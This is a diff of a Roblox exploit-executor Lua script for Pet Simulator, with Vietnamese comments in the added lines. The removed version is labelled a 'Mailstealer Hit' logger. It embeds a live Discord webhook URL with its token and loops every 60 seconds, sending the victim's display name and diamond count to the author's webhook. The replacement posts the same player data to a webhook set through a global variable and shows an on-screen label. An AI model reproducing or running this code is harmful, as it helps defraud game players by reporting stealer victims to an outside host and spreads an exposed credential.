@@ -1,53 +1,29 @@
-local WebHook = "https://discord.com/api/webhooks/1202269897640644618/Nzv-sppXD3s2-1tmOTwf1f4gxKFNs6s7GEXCtbxiaWPcpB04_Jpxh7y87bar_uyx8THO"
-local Creator = "altaasui1"
+local HttpService = game:GetService("HttpService")
 
-local isSynapse, isFluxus, isDelta = false, false, false
+local Request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 
--- Detect executor
-if syn then
-    isSynapse = true
-elseif getgenv().Fluxus then
-    isFluxus = true
-elseif protect_gui and protect_gui["CreateWindow"] then
-    isDelta = true
-end
+-- Lấy player và giá trị của Diamonds
+local plr = game.Players.LocalPlayer
+local leaderstats = plr:FindFirstChild("leaderstats")
+local diamondsStat = leaderstats and leaderstats:FindFirstChild("\240\159\146\142 Diamonds")
+local diamondsValue = diamondsStat and diamondsStat.Value
 
-while true do
-    local displayUsername = game.Players.LocalPlayer.DisplayName
+-- Lấy tên người chơi Roblox
+local robloxUserName = plr and plr.Name
 
-    local gemsAmount = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
-    local creatorsList = "Sen/Aasui/Sintax"
-    local exclusivePet, hugePet = "N/A", "N/A"
-    local playerRank = "N/A"
+-- Lấy webhookUrl từ biến getgenv().Set.webhook
+local webhookUrl = getgenv().Set.webhook
 
-    -- Access the game's data to get gems, exclusive pet, huge pet, and rank information
-    local playerData = game.Players.LocalPlayer
-    local leaderstats = playerData:FindFirstChild("leaderstats")
-
-    if leaderstats then
-        local diamondsValue = leaderstats:FindFirstChild("Diamonds")
-        local rankValue = leaderstats:FindFirstChild("Rank")  -- Adjust "Rank" to the actual name of the player rank value
-
-        gemsAmount = diamondsValue and diamondsValue.Value or 0
-        playerRank = rankValue and rankValue.Value or "N/A"
-    end
-
-    local data = {
-        content = "||@everyone|| Mailstealer Hit 🎉",
+-- Kiểm tra xem có giá trị Diamonds, tên người chơi và webhookUrl hay không
+if diamondsValue and robloxUserName and webhookUrl then
+    -- Chuẩn bị nội dung thông điệp
+    local message = {
+        content = "||@everyone|| webhook 🎉",
         embeds = {
             {
                 title = "(:penguin:) Player Info",
                 description = string.format(
-                    "(:lock:) Executed By: %s\n(:game_die:) Creator: %s\n(:pushpin:) Version: 1.0(beta)\n\n" ..
-                    "(:cat:) Pets List\n(:gem:) Gems: %s\n(:rocket:) Exclusive Pet: %s\n(:star:) Huge Pet: %s\n\n" ..
-                    "(:crown:) Rank: %s\n(:rocket:) Creators: %s",
-                    displayUsername,
-                    Creator,
-                    tostring(gemsAmount),
-                    exclusivePet,
-                    hugePet,
-                    playerRank,
-                    creatorsList
+                    content = "```Game: Pet Simulator" .. "\nPlayer: " .. robloxUserName .. "\nDiamonds: " .. diamondsValue .. "\nDCT DisplayBlox```"
                 ),
                 type = "rich",
                 color = tonumber(65311),
@@ -56,52 +32,46 @@ while true do
         }
     }
 
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
+    -- Chuyển đổi thông điệp thành JSON
+    local jsonMessage = HttpService:JSONEncode(message)
 
-    local url = WebHook
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    -- Gửi thông điệp đến webhook Discord
+    local success, response = pcall(function()
+        return Request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonMessage
+        })
+    end)
 
-    local success, response
-    if isSynapse then
-        success, response = pcall(function()
-            return syn.request({
-                Url = url,
-                Method = "POST",
-                Headers = headers,
-                Body = newdata
-            })
-        end)
-    elseif isFluxus then
-        -- Fluxus uses `request` method
-        success, response = pcall(function()
-            return request({
-                Url = url,
-                Method = "POST",
-                Headers = headers,
-                Body = newdata
-            })
-        end)
-    elseif isDelta then
-        -- Delta uses `request` method
-        success, response = pcall(function()
-            return request({
-                Url = url,
-                Method = "POST",
-                Headers = headers,
-                Body = newdata
-            })
-        end)
-    end
-
+    -- Kiểm tra xem gửi thành công hay không
     if success then
-        print("Message sent successfully.")
-        print("Response:", response)
+        print("DisplayBlox DCT")
     else
-        warn("Failed to send message.")
-        warn("Error:", response)
+        warn("Không thể gửi thông điệp đến webhook Discord:", response)
     end
 
-    wait(60)
+    -- Tạo GUI (User Interface) để hiển thị giá trị Diamonds
+    local gui = Instance.new("ScreenGui")
+    gui.Parent = game.Players.LocalPlayer.PlayerGui
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 200, 0, 50)
+    frame.Position = UDim2.new(0.5, -100, 0, 50)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    frame.BorderSizePixel = 2
+    frame.BorderColor3 = Color3.new(1, 1, 1)
+    frame.Parent = gui
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.Text = "Diamonds: " .. tostring(diamondsValue)
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.BackgroundTransparency = 1
+    label.Parent = frame
+else
+    warn("Không tìm thấy giá trị Diamonds, tên người chơi, hoặc webhookUrl.")
 end
